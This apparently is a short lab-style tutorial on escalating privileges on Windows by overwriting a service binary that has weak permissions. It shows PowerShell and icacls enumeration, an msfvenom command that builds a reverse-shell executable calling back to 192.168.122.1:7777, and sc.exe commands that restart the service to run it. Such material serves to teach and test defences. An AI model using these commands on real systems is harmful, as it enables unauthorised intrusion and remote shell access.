Other than changing the configuration of the service, the original binary itself could be configured with `weak permissions`. In these situations a malicious actor can modify the binary by overwriting it with a malicious binary.

First, we get the binary paths of the various processes
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

 We can use the `icals` utility to check the configuration on the specific binary
```powershell
icacls.exe .\simpleService.ex
```

Output
```powershell
PS C:\Users\Quickemu\Downloads> icacls.exe .\simpleService.ex
.\simpleService.exe NT AUTHORITY\SYSTEM:(F)
					BUILTIN\Administrators:(F)
					QUICKEM-5QLQQP9\Quickemu:(F)

Successfully processed 1 files; Failed processing 0 files
```

 Notice that the user `Quickemu` has full access over the service binary `simpleService.exe`. This means we can overwrite it with an arbitrary binary.

To exploit, the following steps can work:

1. Generate the malicious binary and transfer it to the victim machine.
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
```

2. Overwrite the service binary

Make a backup
```powershell
cp .\simpleService.exe .\simpleService.exe.bkp
```

Overwrite the service binary 
```powershell
cp .\malicious.exe .\simpleService.exe
```

3. Restart the service
```powershell
sc.exe stop SimpleService
```

```powershell
sc.exe start SimpleService
```
